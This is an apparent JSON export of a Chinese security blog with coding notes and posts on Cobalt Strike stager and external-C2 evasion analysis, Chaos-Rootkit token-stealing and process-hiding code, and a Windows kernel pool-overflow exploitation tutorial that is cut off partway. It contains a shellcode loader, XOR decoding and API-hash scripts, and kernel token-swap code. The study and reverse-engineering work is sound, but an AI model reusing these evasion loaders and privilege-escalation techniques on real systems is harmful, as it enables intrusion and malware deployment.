{"meta":{"title":"Joe1sn's Cabin","subtitle":"","description":"","author":"Joe1sn","url":"https://joe1sn.eu.org","root":"/"},"pages":[],"posts":[{"title":"【置顶】【通知】新的测试版本博客","slug":"new-blog-post","date":"2098-12-31T16:00:00.000Z","updated":"2025-03-05T09:34:45.862Z","comments":true,"path":"2099/01/01/new-blog-post/","link":"","permalink":"https://joe1sn.eu.org/2099/01/01/new-blog-post/","excerpt":"厌倦了nodejs的庞大本地空间占用，不熟悉前端部署困难的其他博客框架，只是想放几篇文章上去 我选择使用c++20编写了一个类似hexo的博客框架，目前处于测试中","text":"厌倦了nodejs的庞大本地空间占用，不熟悉前端部署困难的其他博客框架，只是想放几篇文章上去 我选择使用c++20编写了一个类似hexo的博客框架，目前处于测试中 【通知】新的测试版本博客 测试网页：https://joe1sn.eu.org/TestRepo/ 项目源代码：https://github.com/Joe1sn/PureWeb 使用c++20编写博客框架，目前仍在测试与开发中，处于it just work阶段","categories":[],"tags":[]},{"title":"【置顶】【编程】开发笔记","slug":"develop_handbook","date":"2098-12-31T13:06:45.000Z","updated":"2025-05-17T03:56:35.459Z","comments":true,"path":"2098/12/31/develop_handbook/","link":"","permalink":"https://joe1sn.eu.org/2098/12/31/develop_handbook/","excerpt":"日常开发遇到的一些坑，记录一下挺有意思的","text":"日常开发遇到的一些坑，记录一下挺有意思的 python sqlalchemy 查询结果扩大化 123def get_self_info(uuid: str): tasks = session.query(SelfInfo).filter(uuid == uuid).all() return tasks 很明显的typo错误，uuid == uuid是恒成立的，所以会返回所有的结果，导致某个用户获得全部的结果 应当改为 123def get_self_info(need_uuid: str): tasks = session.query(SelfInfo).filter(SelfInfo.uuid == need_uuid).all() return tasks 甚至 123def get_self_info(uuid: str): tasks = session.query(SelfInfo).filter(SelfInfo.uuid == uuid).all() return tasks c++ Qt6 emit 时undefine 原因是类中没有添加QT的宏定义Q_OBJECT，正常应该如下 12345678class BeaconTable :public BasicTable&lt;TargetInfo&gt;&#123; Q_OBJECTsignals: void doA(int Id); void doB(int Id);&#125;; 抽象类中不能使用该宏定义 c++ 抽象类 123template&lt;typename T&gt;class Table :&#123;&#125; 在cpp中要 12template&lt;typename T&gt;void Table&lt;T&gt;::deleteRow(int row)&#123;&#125; 并且明确具体的抽象类 12template class Table&lt;int&gt;;template class Table&lt;char*&gt;; python-asyncio.StreamReader read不完全 比如期待 data=read(n)但是len(data) &lt; n是因为缓冲区大小或者去处理其他的read导致一次await read无法读取完毕，但是可以利用循环分块读取 12345while len(data) &lt; file_len: chunk = await reader.read(file_len - len(data)) if not chunk: break data += chunk python-sqlalchemy偶尔出现 tuple Index out of range model如下 1234567class Sessions(Base): &#x27;&#x27;&#x27;Session used in cookie&#x27;&#x27;&#x27; __tablename__ = &#x27;sessions&#x27; id = Column(Integer, primary_key=True, autoincrement=True) # PK created_at = Column(Integer, default=lambda: int(time.time()), nullable=False) username = Column(String(32), nullable=False) token = Column(String(64), nullable=False) 查询controller如下 1234567def check_session(stoken: str) -&gt; bool: from db import session exists = session.query( Sessions.id) .filter(Sessions.token == stoken) .all() return len(exists&gt;=1) 可能有其他错误，并且只是偶尔发生 原因：DBAPI中的并发问题，一个连接不能同时处理大量信息 解决：在这个controller中新建一个连接 1234567891011121314151617181920212223class ConnDB: #... self.__engine = create_engine( &#x27;sqlite:///&#123;&#125;&#x27;.format(self.__path), connect_args=&#123;&quot;check_same_thread&quot;: False, &quot;timeout&quot;: 30, # 设置超时 &quot;isolation_level&quot;: &quot;IMMEDIATE&quot;&#125;, # 更好的并发控制 pool_pre_ping=True, echo=False) self.__session = sessionmaker(bind=self.__engine, autocommit=False, autoflush=False,) #...Session = conn_db.get_session()def check_session(stoken: str) -&gt; bool: db = Session() exists = db.query( db.query(Sessions.id) .filter(Sessions.token == stoken) .exists() ).scalar() db.close() return exists vscode鼠标拖动代码页分栏失效/没反应 环境：windows 解决方法：cmd+shift+p 运行两次 Developer: Toggle Screencast Mode if-else与++i --i 写if最好先把else也写上，i++是语句结束后i+1，++i是立即加 左值与右值 左值：表达式左边的值，可以被查找到地址的、持久存在的值 右值：字面量，或者std::move后的左值 左值引用：就是变量的别名 右值引用：绑定到临时、即将销毁的对象，使用方法int &amp;&amp;right。意义就是避免内存操作 构造函数 构造函数就是一个类初始化的时候所需要的函数，主要分为以下几类 默认构造函数 带参数的构造函数 拷贝构造函数：可以实现对象的深拷贝和浅拷贝，省略&amp;会导致无限递归 移动构造函数：接受一个右值引用（std::move） 转换构造函数 委托构造函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class Base &#123;public: int val; //默认构造函数 Base():val(int(0)) &#123; std::cout &lt;&lt; &quot;默认构造函数. value is &quot; &lt;&lt; this-&gt;val &lt;&lt; std::endl; &#125; //带参数的构造函数 Base(int v):val(v) &#123; std::cout &lt;&lt; &quot;带参数的构造函数. value is &quot; &lt;&lt; this-&gt;val &lt;&lt; std::endl; &#125; //拷贝构造函数 Base(const Base&amp; other): val(other.val) &#123; std::cout &lt;&lt; &quot;拷贝构造函数. value is &quot; &lt;&lt; this-&gt;val &lt;&lt; std::endl; &#125; //移动构造函数 Base(Base&amp;&amp; other) noexcept: val(other.val) &#123; other.val = 0xFF; std::cout &lt;&lt; &quot;移动构造函数. value is &quot; &lt;&lt; this-&gt;val &lt;&lt; std::endl; &#125; //转换构造函数 explicit Base(double v): val(static_cast&lt;int&gt;(v)) &#123; std::cout &lt;&lt; &quot;转换构造函数. value is &quot; &lt;&lt; this-&gt;val &lt;&lt; std::endl; &#125; //委托构造函数 Base(char v) : Base() &#123; this-&gt;val = v; std::cout &lt;&lt; &quot;委托构造函数. value is &quot; &lt;&lt; this-&gt;val &lt;&lt; std::endl; &#125; ~Base() &#123;&#125;;&#125;;int main() &#123; Base a; //默认 Base b(1); //带参数 Base c(b); //拷贝 Base d(std::move(b)); //移动 Base e(3.124); //转换 Base f(&#x27;A&#x27;); //委托 return 0;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"c","slug":"c","permalink":"https://joe1sn.eu.org/tags/c/"},{"name":"python","slug":"python","permalink":"https://joe1sn.eu.org/tags/python/"}]},{"title":"【免杀】使用CobaltStrike的外置监听器绕过检测-番外","slug":"cs-external-2","date":"2025-06-23T03:25:14.000Z","updated":"2025-06-23T03:27:39.275Z","comments":true,"path":"2025/06/23/cs-external-2/","link":"","permalink":"https://joe1sn.eu.org/2025/06/23/cs-external-2/","excerpt":"可能是最简单一种免杀方式了 对于自己开发c2有启发意义 公众号：https://mp.weixin.qq.com/s/WSX-MxkV-8QUfsNULFM3Kg","text":"可能是最简单一种免杀方式了 对于自己开发c2有启发意义 公众号：https://mp.weixin.qq.com/s/WSX-MxkV-8QUfsNULFM3Kg 在上一篇文章：【免杀】使用CobaltStrike的外置监听器绕过检测 我们实现了一个能通过external C2 来对杀软进行绕过的方法，那么为什么行呢？这里对通讯的流量进行分析。 首先是在spawnBeacon需要运行一段teamserver发送过来的shellcode 1234567891011// Allocates a RWX page for the CS beacon, copies the payload, and starts a new threadvoid spawnBeacon(char *payload, DWORD len)&#123; HANDLE threadHandle; DWORD threadId = 0; char *alloc = (char *)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(alloc, payload, len); threadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &amp;threadId);&#125; 在IDA中下断点看看，这里的客户端是自己编译的，因此选择Debug模式，这样IDA能通过pdb文件实现源码级F5（其实也不算反编译） 看看这段汇编长啥样 第一个call rbx翻译成C 这里从第三方客户端Dump下文件后查看 findPEFile 首先获得当前rsp的值，并且由于是小端序，应该从右向左读。从启示地址开始读取，直到读取到PE文件的DOS头的e_magic，接着再判断PE头，如果都成立，则返回DOS文件头的地址，所以我在上层函数中将返回的类型设置为了PIMAGE_DOS_HEAD Part I. sub_180017948 在使用IDA打开Dump下来的bin文件时，IDA会将其默认解析为PE文件格式，说明这就是在反射式加载一个PE文件，所以要首先从LDR中加载出基本函数，例如LoadLibrary、VirtualAlloc等 首先是经典的InMemoryOrderModuleList循环遍历寻找 这个循环看不懂，我把i的类型设置为struct _LDR_DATA_TABLE_ENTRY *i再来看看 __ROR4__：将v8向右循环移动13位，使用这个作为单次循环读取到字符的哈希运算 break的条件是：v8 == 0x6A4ABC5B 既然是哈希，这个过程肯定是不可逆的，所以动态调试一下 发现值为：KERNEL32.DLL可以得到该哈希，注意这里字串是wchar_t*的宽字符类型，需要在 Options-&gt;String Literals 选择编码方式为unicode 尝试使用python暴力破解一下 1234567891011121314151617181920212223242526import osdef ror4(value: int, bits: int) -&gt; int: value &amp;= 0xFFFFFFFF # 保证是32位 return ((value &gt;&gt; bits) | (value &lt;&lt; (32 - bits))) &amp; 0xFFFFFFFFdef hasher(filename: bytes)-&gt;int: v8 = 0 for ch in filename: v9 = ror4(v8, 13) v8 = (v9 + ord(ch)) &amp; 0xFFFFFFFF v9 = ror4(v8, 13) v8 = (v9 + 0) &amp; 0xFFFFFFFF return v8if __name__ == &#x27;__main__&#x27;: folder_path = &quot;C:\\\\Windows\\\\System32&quot; files = os.listdir(folder_path) for file in files: if(file[-4:]!=&quot;.dll&quot;): continue hash = hasher(file.upper()) if(hash==0x6A4ABC5B): print(&quot;Found&quot;, file, &quot;hash is right: &quot;, hex(hash).upper()) break 这里使用的是C:\\\\Windows\\\\System32目录下的DLL文件名 接着在静态我已经仅我最大努力了，可是还有很多不懂得 不过按照一般的流程就是找需要的导出函数了，动态调试看看 那么大概意思清楚了：读取dll的导出函数，进行自定义的哈希运算，找到符合的函数，从而加载函数，及GetProcAddress的实现 123do v6 = *v14++ + __ROR4__(v6, 13);while ( *v14 ); 知道了是kernel32.dll的函数，我们自己测试看看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import osimport pefiledef ror4(value: int, bits: int) -&gt; int: value &amp;= 0xFFFFFFFF # 保证是32位 return ((value &gt;&gt; bits) | (value &lt;&lt; (32 - bits))) &amp; 0xFFFFFFFFdef hasher(filename: bytes, wide_char: bool = True)-&gt;int: v8 = 0 for ch in filename: v9 = ror4(v8, 13) v8 = (v9 + ord(ch)) &amp; 0xFFFFFFFF if(wide_char): v9 = ror4(v8, 13) v8 = (v9 + 0) &amp; 0xFFFFFFFF return v8def list_exported_functions(pe_path:str)-&gt;list: result = [] pe = pefile.PE(pe_path) if not hasattr(pe, &#x27;DIRECTORY_ENTRY_EXPORT&#x27;): print(&quot;此文件没有导出表。&quot;) return for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols: name = exp.name.decode() if exp.name else &quot;&lt;no name&gt;&quot; address = hex(pe.OPTIONAL_HEADER.ImageBase + exp.address) ordinal = exp.ordinal result.append(name) return resultif __name__ == &#x27;__main__&#x27;: folder_path = &quot;C:\\\\Windows\\\\System32&quot; files = os.listdir(folder_path) filename = &quot;&quot; for file in files: if(file[-4:]!=&quot;.dll&quot;): continue hash = hasher(file.upper()) if(hash==0x6A4ABC5B): print(&quot;Found&quot;, file, &quot;hash is right: &quot;, hex(hash).upper()) filename = file break if(filename != &quot;&quot;): filepath = os.path.join(folder_path, filename) func_names = list_exported_functions(filepath) val = hasher(func_names[0], False) print(func_names[0], hex(val)) 修改一下一小段脚本 1234567891011121314151617if(filename != &quot;&quot;): filepath = os.path.join(folder_path, filename) func_names = list_exported_functions(filepath) for name in func_names: v6 = hasher(name, False) if v6 == 0xEC0E4E8E: print(&quot;No.2&quot;,name,&quot;\\t&quot;, f&quot;0x&#123;v6:02X&#125;&quot;) if v6 == 0x7C0DFCAA: print(&quot;No.1&quot;,name,&quot;\\t&quot;, f&quot;0x&#123;v6:02X&#125;&quot;) if v6 == 0x91AFCA54: print(&quot;No.4&quot;,name,&quot;\\t&quot;, f&quot;0x&#123;v6:02X&#125;&quot;) if v6 == 0x7946C61B: print(&quot;No.5&quot;,name,&quot;\\t&quot;, f&quot;0x&#123;v6:02X&#125;&quot;) if v6 == 0x753A4FC: print(&quot;No.3&quot;,name,&quot;\\t&quot;, f&quot;0x&#123;v6:02X&#125;&quot;) if v6 == 0xD3324904: print(&quot;No.0&quot;,name,&quot;\\t&quot;, f&quot;0x&#123;v6:02X&#125;&quot;) 最后函数完成的v13 关于如何实现GetProcAddress，可以参考之前关注发的文章：PE文件格式解析 的 《如何找到导入的函数和DLL-导入表》部分 sub_180017D38 主函数ReflectiveLoader检查完成后进入sub_180017D38 根据之前的分析 *a函数就是GetModuleHandlerA，可以获得当前PE文件在内存中的位置 a[1]函数就是GetProcAddress sub_180017F88 ntHead-&gt;FileHeader.Characteristics描述了IMAGE的特征。其中0x8000：反转单词的字节数。 此标志已过时。 根据参数修改下sub_180017F88的类型就很好看了 动态调试发现没有走上面的复杂逻辑，或许是为了兼容性？ 等效运行 1VirtualAlloc(0, SizeofImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) 后续函数 基本就是反射式载入那一套，你依旧可以参考：https://github.com/stephenfewer/ReflectiveDLLInjection 最后跳转到LoaderFlags或者AddressOfEntryPoint，这里是dllmain，开始运行恶意DLL sub_180018158 CopyDOSHeader 复制PE文件DOS头 sub_180018218 ReflectSections 加载PE文件的Section到内存 sub_180018318 GetImportTable 从导入表开始导入相关函数和Dll sub_1800185D8 DoRelocation 读取重定位表，进行重定位 小结 继续升入下去可以挖掘出cobaltstrike功能实现的方法和技巧。 这种方式的有效shellcode仅有跳转到ReflectLoader之前的一小段汇编代码，所以看上“比较合法”，这样也大大提升了躲避检测的能力 同时这种方式可以使用之前提到过的反射式加载器加，不过需要自己维持一个ipc（名称一定要正确）和socket来负责传递数据","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://joe1sn.eu.org/tags/bypass/"}]},{"title":"【免杀】Cobaltstrike Stager Payload分析","slug":"cs-stager-payload-1","date":"2025-06-08T15:45:15.000Z","updated":"2025-06-08T15:47:15.487Z","comments":true,"path":"2025/06/08/cs-stager-payload-1/","link":"","permalink":"https://joe1sn.eu.org/2025/06/08/cs-stager-payload-1/","excerpt":"cobaltstrike的payload主要分为Stager和Stageless Stager：分阶段式上线，从teamserver下载真正的payload后执行，体积小 Stageless：部分阶段上线，真正的payload直接在其中，适合用于红队测试中的免杀制作，体积大 公众号：https://mp.weixin.qq.com/s/UsPTeRZvlLFUG-EjCkVqTQ","text":"cobaltstrike的payload主要分为Stager和Stageless Stager：分阶段式上线，从teamserver下载真正的payload后执行，体积小 Stageless：部分阶段上线，真正的payload直接在其中，适合用于红队测试中的免杀制作，体积大 公众号：https://mp.weixin.qq.com/s/UsPTeRZvlLFUG-EjCkVqTQ 或许我们的公众号会有更多你感兴趣的内容 Stager Exe Payload分析 软件版本：Teamserver 4.9.1 Payloads-&gt;Windows Stager Payload，具体配置如下 IDA 分析 入口点位于：4014C0 sub_401990 利用时间等信息异或获得两个随机数：randomA_4044D0和randomB_4044E0，且二者&amp;为0xFFFFFFFFFFFF sub_401180 一些初始化的操作，和主要功能关系不大 sub_403040 真正释放payload的地方 sub_4017F8 这里模仿了windows中的管道的命名方式，并在后续的sub_4016E6创建该管道 sub_4016E6 -&gt; sub_401630 创建了命名管道后写入一些内容后关闭管道 查看调用发现向管道写入 lpBuffer_的0x37D字节 shift+e先保存lpBuffer_方便后续分析 sub_4017A6 在创建线程冰箱管道写入过后进入该函数 sub_401704 从命名管道读取0x37D到申请的lpBuffer sub_401595 经典的运行shellcode片段，调用如下sub_401595(lpBuffer, nNumberOfBytesToWrite, &amp;unk_404028);。对刚才从管道中读出的数据进行了异或来还原，异或的key为unk_404028 编写还原脚本 12345678910if __name__ == &#x27;__main__&#x27;: cipher = b&quot;&quot; keys = [0xC2, 0xF0, 0xA1] with open(&quot;lpBuffer_.bin&quot;,&quot;rb&quot;) as srcFile: cipher=srcFile.read() with open(&quot;decrypted_shellcode.bin&quot;,&quot;wb&quot;) as dstFile: counter = 0 for c in cipher: dstFile.write((c ^ keys[counter % 3]).to_bytes(1,&#x27;little&#x27;)) counter += 1 唯一一个需要注意的地方就是C语言是固定数据类型的，所以使用&amp;可以达到和%一样的效果，只不过**&amp;3等效于%4**。python中的数据是不固定的，所以使用&amp;可能由于数据长度导致数字错误从而index out of range 到这里观察我们还原出来的shellcode 如果我们对于相同的payload和listener生成shellcode 发现惊人的相似，主要不同 得出结论：CobaltStrike 的 Stager Excute生成的artifact.exe是在运行Stager Shellcode sub_401563 比shellcode好多了的是这种payload会使用exe提供的GetModuleHandleA和GetProcAddress，从而避免了从LDR中遍历得到 Stager Shellcode Payload分析 将刚才还原的decrypted_shellcode.bin放到ida中分析汇编（64位） 最开始IDA会将这段识别为数据，可以直接右键 可以创建为一个函数，便于分析 汇编逐行分析的话确实有点冗长 第一阶段：找到相关函数并加载 这里使用循环Ldr和异或比较得到关键值 一般来说对应的C代码长这样 找到loadlib 加载wininet加载相关函数，如果想知道传入的参数，直接按照传参顺序看寄存器即可（一般是stdcall） 估计从这里开始准备接收第二阶段payload然后运行 这里每次读取0x2000大小知道读完，传输了一段shellcode 第二阶段：反射式加载payload，这里运行的shellcode就是teamserveer分发过来的了，提取这部分的shellcode","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://joe1sn.eu.org/tags/bypass/"}]},{"title":"【RootKit】Chaos-Rootkit解读-2 权限提升","slug":"rookit-2-priv-escalation","date":"2025-05-08T00:16:35.000Z","updated":"2025-05-08T00:58:53.373Z","comments":true,"path":"2025/05/08/rookit-2-priv-escalation/","link":"","permalink":"https://joe1sn.eu.org/2025/05/08/rookit-2-priv-escalation/","excerpt":"去年学了点kernel开发，实战太少了，看看别人的代码怎么写的 项目地址：https://github.com/ZeroMemoryEx/Chaos-Rootkit","text":"去年学了点kernel开发，实战太少了，看看别人的代码怎么写的 项目地址：https://github.com/ZeroMemoryEx/Chaos-Rootkit 权限提升 测试环境： 连接到rookit 原理剖析 其实可以手动实现这个过程 首先打开一个cmd.exe 结构体中表示权限的是一个叫+0x4b8 Token : _EX_FAST_REF的东西 Token是一个_EX_FAST_REF类型的Union值 RefCnt记录了Token引用的数目，是数据的低4位(64位中，32位是3位) 将当前进程的除RefCnt以外的其他bit位设置为和System的一致就行了 这里 Value与掩码-0xd（RefCount）进行&amp;运算就能得到真实的Token值 现在将计算出的Token值复制给cmd.exe（这是一个新的Token） 更进一步 另外一种就是经典的 **_sep_token Privileges Abusing ** 在+0x40的位置是一个_sep_token_privileges结构体 Present：包含令牌的当前特权 Enabled：包含令牌上所有已启用的特权 EnabledByDefault 表示令牌在构造时的默认状态 尝试将enable值变为present 如果方法一中有部分权限未启用，可以使用这种方法开启所有特权 代码分析 123456789101112131415161718192021222324252627282930313233343536DWORD PrivilegeElevationForProcess(int pid)&#123; PVOID process = NULL; PVOID systemProcess = NULL; PACCESS_TOKEN targetToken = NULL; PACCESS_TOKEN systemToken = NULL; __try &#123; // Lookup the target process by PID NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &amp;process); //... status = PsLookupProcessByProcessId((HANDLE)0x4, &amp;systemProcess); //... char* imageName = PsGetProcessImageFileName((PEPROCESS)process); DbgPrint(&quot;Target process image name: %s\\n&quot;, imageName); targetToken = PsReferencePrimaryToken(process); //... DbgPrint(&quot;%s token: %x\\n&quot;, imageName, targetToken); systemToken = PsReferencePrimaryToken(systemProcess); //... DbgPrint(&quot;System token: %x\\n&quot;, systemToken); ULONG_PTR targetTokenAddress = (ULONG_PTR)process + eoffsets.Token_offset; DbgPrint(&quot;%s token address: %x\\n&quot;, imageName, targetTokenAddress); ULONG_PTR systemTokenAddress = (ULONG_PTR)systemProcess + eoffsets.Token_offset; DbgPrint(&quot;System token address: %x\\n&quot;, systemTokenAddress); *(PHANDLE)targetTokenAddress = *(PHANDLE)systemTokenAddress; DbgPrint(&quot;Process %s token updated to: %x\\n&quot;, imageName, *(PHANDLE)(targetTokenAddress)); &#125; __finally &#123; //... &#125; return STATUS_SUCCESS;&#125; 最关键的就是*(PHANDLE)targetTokenAddress = *(PHANDLE)systemTokenAddress; 效果","categories":[],"tags":[{"name":"note","slug":"note","permalink":"https://joe1sn.eu.org/tags/note/"},{"name":"rootkit","slug":"rootkit","permalink":"https://joe1sn.eu.org/tags/rootkit/"}]},{"title":"【RootKit】Chaos-Rootkit解读-1 进程隐藏","slug":"rookit-1-hide-process","date":"2025-04-29T23:29:17.000Z","updated":"2025-04-30T01:03:48.245Z","comments":true,"path":"2025/04/30/rookit-1-hide-process/","link":"","permalink":"https://joe1sn.eu.org/2025/04/30/rookit-1-hide-process/","excerpt":"去年学了点kernel开发，实战太少了，看看别人的代码怎么写的 项目地址：https://github.com/ZeroMemoryEx/Chaos-Rootkit","text":"去年学了点kernel开发，实战太少了，看看别人的代码怎么写的 项目地址：https://github.com/ZeroMemoryEx/Chaos-Rootkit 进程隐藏 测试环境： 连接到rookit 使用效果： 原理剖析 在Driver.c/processIoctlRequest中处理这个功能的ioctl 123456789101112131415161718192021222324252627282930313233343536373839NTSTATUS processIoctlRequest( DEVICE_OBJECT* DeviceObject, IRP* Irp)&#123; PIO_STACK_LOCATION pstack = IoGetCurrentIrpStackLocation(Irp); int pstatus = 0; int inputInt = 0; __try &#123; // if system offsets not supported / disable features // that require the use of offsets to avoid crash if (pstack-&gt;Parameters.DeviceIoControl.IoControlCode &gt;= HIDE_PROC &amp;&amp; \\ pstack-&gt;Parameters.DeviceIoControl.IoControlCode &lt;= UNPROTECT_ALL_PROCESSES &amp;&amp; xHooklist.check_off) &#123; pstatus = ERROR_UNSUPPORTED_OFFSET; __leave; &#125; switch (pstack-&gt;Parameters.DeviceIoControl.IoControlCode) &#123; case HIDE_PROC: &#123; if (pstack-&gt;Parameters.DeviceIoControl.InputBufferLength &lt; sizeof(int)) &#123; pstatus = STATUS_BUFFER_TOO_SMALL; break; &#125; RtlCopyMemory(&amp;inputInt, Irp-&gt;AssociatedIrp.SystemBuffer, sizeof(inputInt)); pstatus = HideProcess(inputInt); DbgPrint(&quot;Received input value: %d\\n&quot;, inputInt); break; &#125;//... &#125;&#125; 核心功能函数HideProcess 首先通过PsLookupProcessByProcessId找到EPROCESS 然后就是找到activelist双向链表，然后将当前eprocess从双向链表中摘除 关于eprocess的双向链表activelist你可以回顾前文：【Win Pwn】HEVD-内核栈溢出(下) 这里简单提及： 在刚才的EPROCESS中，有一段记录的是程序的链表：ActiveProcessLinks，而且windows会生成一段独特的标识来标记每一个程序：UniqueProcessId，在这段 双向 链表上每段程序都可以被找到，因为可以向前和向后查找。 调试 这里我新建了一个cmd.exe，进程pid为：4648(0x1228) 此时他的flink和blink为 之后使用rootkit 开发 双向链表删除作为数据结构基础部分没啥好说的，值得一提的是这里的锁设计 12345678910111213141516171819202122232425262728DWORDHideProcess( int pid)&#123; //... BOOLEAN lockAcquired = FALSE; __try &#123; __try &#123; //... ExAcquirePushLockExclusive(&amp;pLock); lockAcquired = TRUE; //... &#125; //... &#125; __finally &#123; //... if (lockAcquired) ExReleasePushLockExclusive(&amp;pLock); &#125; return (status);&#125; 在os运行时，内核可能会对这块链表进行修改，当我们修改时在这里添加一个锁可以有效地避免条件竞争导致出现的未定义行为 防护 其实可以这样想，在任务管理器中我们已经看不到了这个进程，那么为什么在windbg中依然能够通过PID找到该进程呢？","categories":[],"tags":[{"name":"note","slug":"note","permalink":"https://joe1sn.eu.org/tags/note/"},{"name":"rootkit","slug":"rootkit","permalink":"https://joe1sn.eu.org/tags/rootkit/"}]},{"title":"【Win Pwn】Windows10 内核池溢出","slug":"win-exp-big-non-paged-pool-overflow","date":"2025-04-16T01:04:54.000Z","updated":"2025-04-17T00:21:49.635Z","comments":true,"path":"2025/04/16/win-exp-big-non-paged-pool-overflow/","link":"","permalink":"https://joe1sn.eu.org/2025/04/16/win-exp-big-non-paged-pool-overflow/","excerpt":"内核也太难了，主要讲述大NonPagedPool的溢出利用 公众号：https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg","text":"内核也太难了，主要讲述大NonPagedPool的溢出利用 公众号：https://mp.weixin.qq.com/s/XjaPdNwqABFqDZsZTDtZJg 或许我们的公众号会有更多你感兴趣的内容 【复现】Windows10 内核池溢出 前置知识： windows内核调试 windows内核提权基础 简单的windows驱动编写（hello world级别） linux pwn堆溢出利用方式 一点点数据结构的知识（双向链表） 文章讲述并复现在Windows高版本内核中NonPagedPoolNx溢出的利用方法 目录 [toc] 利用方式 ​ 很多资料都是直接翻译外文文献，翻译质量差，没有直接的实操，并且随着windows的更新，比较缺乏现代windows 10\\11的、比较易学的攻击方式。这里使用：Windows-Non-Paged-Pool-Overflow-Exploitation[1]作为基础的讲解，原文中的图示个人感觉还是讲的不够透彻,这里个人借着原文重新讲述下。 命名管道介绍 ​ 这是windows提供的用于进程间通讯的一种机制。首先是**服务端(server)**创建命名管道，**客户端(client)**使用CreateFile连接到服务端。双方可以使用ReadFile和WriteFile进行读、写的通讯。这种利用方式非常常见，比如说在cobaltstrike的木马中就是用到了这种通讯，具体例子可以参考公众号的文章： 【免杀】使用CobaltStrike的外置监听器绕过检测[2]。 ​ 当管道成功建立后，底层驱动程序(npfs.sys)会在上下文控制块 (CCB) 中创建两个队列，每个队列对应一个CCB队列。当有消息写入时，比如**服务端想客户端发送消息(WriteFile)**时，会在队列中创建如下结构体，后文简称为dqe 12345678910struct DATA_QUEUE_ENTRY &#123; LIST_ENTRY NextEntry; _IRP* Irp; _SECURITY_CLIENT_CONTEXT* SecurityContext; uint32_t EntryType; uint32_t QuotaInEntry; uint32_t DataSize; uint32_t x; char Data[];&#125; 当**客户端开始接收消息(ReadFile)**时，就会从队列中释放掉该消息 NextEntry: Windows中的经典 双向循环链表，LIST_ENTRY中flink指向下一个entry，blink指向上一个。当结构体被释放时(如执行ReadFile)，会进行相邻结构体链表之间的重新连接，也就是数据结构中双向链表中的删除操作。注意的是，在windows 10中新增了校验操作 1entry-&gt;Flink-&gt;Blink!=entry 这样可以避免溢出时覆盖entry-&gt;flink的blink，造成的劫持 SecurityContext: 安全上下文，主要是模仿客户端的行为，比如客户端访问权限等，在这里并不重要。 EntryType: DATA_QUEUE_ENTRY的类型，一般分为两种：buffered和unbuffered buffered: EntryType=0，DATA_QUEUE_ENTRY 中申请的buf大小足够存放UserData，读取时直接从UserData处复制 unbuffered: EntryType=1，DATA_QUEUE_ENTRY 中申请的buf大小只存放DATA_QUEUE_ENTRY，读取时要调用IRP来实现读取。可以使用如下函数来创建这种Entry 1NtFsControlFile(pipe_handle, 0, 0, 0, &amp;isb, 0x119FF8, buf, sz, 0, 0); Irp: 处理的中断请求 QuotaInEntry: 空间剩余配额，对于buffered来说，每次读取可能不会全部读完，QuotaInEntry记录了剩余UserData读取的大小，即QuotaInEntry初始值等于DataSize，每次读取都会减去已经读取的长度，直到QuotaInEntry=0；对于unbuffered来说值恒为0。 DataSize: 很重要，它描述了UserData的大小。 当服务端想客户端发送消息时，npfs会申请0x30+DataSize大小(并会对齐)的内核池，其中0x30是为了存放DATA_QUEUE_ENTRY头部 配额管理机制 配额管理机制(QuotaInEntry)：允许通信通道的服务器端指定队列可容纳的最大数据大小。超过该限制时： 在阻塞模式 (PIPE_WAIT) 下，创建条目时将 QuotaInEntry 设置为当前队列中可用的字节数。之后，每次对缓冲条目执行读取（read而非peek）操作后，读取大小都会添加到已停止写入的 QuotaInEntry 中。当 QuotaInEntry 等于 DataSize 时，表示管道配额中有足够的空间容纳该条目，并且其关联的 IRP 已完成，qde从当前数据条目中移除。 在非阻塞模式 (PIPE_NOWAIT) 下，操作将失败。（写入的字节数将等于 0） 漏洞代码 这里使用： https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation/blob/5315ee63753b0747d5a6010e2486dfbe45b8e123/vulnerable_driver/Overfl0w.cpp#L68 这段代码的64位编译进行讲解，同时我增加了一段打印来方便调试 123456789NTSTATUS Al20c(size_t Size)&#123; char* buf = (char*)ExAllocatePoolWithTag(NonPagedPoolNx, Size, &#x27;AAAA&#x27;); DbgPrint(&quot;[!] Allocate NonpagedPool 0x%p\\n&quot;, buf); for (int i = 0; i &lt;= Size &amp;&amp; buf; i++) buf[i] = &#x27; &#x27;; return STATUS_SUCCESS;&#125; 在for循环中有一个明显的 off by one 漏洞(应当是i &lt; Size)，可以溢出到下一个区块一个字节，并修改为0x20 测试环境是 具体环境搭建可以参考：从零探索现代windows内核栈溢出-以HEVD练习为例（上）[3] 如何完成提权 这里就是利用任意地址读写来对System的token复制到当前进程 任意地址读实现 假设有如下布局 ​ AAAA、BBBB、CCCC三个DATA_QUEUE_ENTRY是逻辑上的相邻关系，但是在内存上，紫色page与BBBB相邻，所以BBBB-&gt;Flink低位被溢出了，这也是在linux pwn的堆利用中很常见的off by one利用手法。这使得BBBB-&gt;Flink指向了CCCC+0x20的位置，那么我们就可以提前在我们可控的CCCC-&gt;UserData里面构建fake EntryType、fake Quota和最重要的Fake DataSize ​ 但是前文中说过fake flink由于不是我们可控的，所以使用ReadFile读取pipe_pool_x会通不过检验，但是[1]中发现一个新的方法可以绕过，即使用PeekNamedPipe函数，这个函数可以读取pipe_pool_x中的数据，而不造成释放和校验。假设pipe_pool_x是从AAAA开始的，那么客户端在pipe_pool_x读取DataSize_AAAA+DataSize_BBBB+DataSize_Fake_CCCC大小的数据时候，顺序就是，1.读取AAAA-&gt;UserData DataSize_AAAA 